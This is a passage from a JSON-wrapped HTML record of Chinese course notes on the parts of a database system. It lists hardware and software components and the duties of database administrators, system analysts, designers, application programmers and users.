磁盘或磁盘阵列（数据库）、光盘、磁带（数据备份）</li>\n<li>较高的通道能力，提高数据传送率</li>\n</ul>\n</li>\n<li>\n<p>软件</p>\n<ul>\n<li>DBMS</li>\n<li>支持 DBMS 运行的操作系统</li>\n<li>与数据库接口的高级语言及其编译系统</li>\n<li>以 DBMS 为核心的应用开发工具</li>\n<li>为特定应用环境开发的数据库应用系统</li>\n</ul>\n</li>\n<li>\n<p>人员</p>\n<ul>\n<li>\n<p>数据库管理员</p>\n<p>1. 决定数据库中的信息内容和结构<br />\n 2. 决定数据库的存储结构和存取策略<br />\n 3. 定义数据的安全性要求和完整性约束条件<br />\n 4. 监控数据库的使用和运行</p>\n<ul>\n<li>周期性转储数据库</li>\n<li>系统故障恢复</li>\n<li>介质故障恢复</li>\n<li>监视审计文件</li>\n</ul>\n<p>5. 数据库的改进和重组</p>\n<ul>\n<li>性能监控和调优</li>\n<li>定期对数据库进行重组织，以提高系统的性能</li>\n<li>需求增加和改变时，数据库须需要重构造</li>\n</ul>\n</li>\n<li>\n<p>系统分析员和数据库设计人员</p>\n<ul>\n<li>系统分析员</li>\n</ul>\n<ol>\n<li>负责应用系统的需求分析和规范说明</li>\n<li>与用户及 DBA 协商，确定系统的硬软件配置</li>\n<li>参与数据库系统的概要设计</li>\n</ol>\n<ul>\n<li>数据库设计人员\n<ol>\n<li>参加用户需求调查和系统分析</li>\n<li>确定数据库中的数据</li>\n<li>设计数据库各级模式</li>\n</ol>\n</li>\n</ul>\n</li>\n<li>\n<p>应用程序员</p>\n<ul>\n<li>设计和编写应用系统的程序模块</li>\n<li>进行调试和安装</li>\n</ul>\n</li>\n<li>\n<p>用户</p>\n<ul>\n<li>偶然用户</li>\n<li>简单用户</li>\n<li>复杂用户</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n",
            "tags": []
        }
    ]
}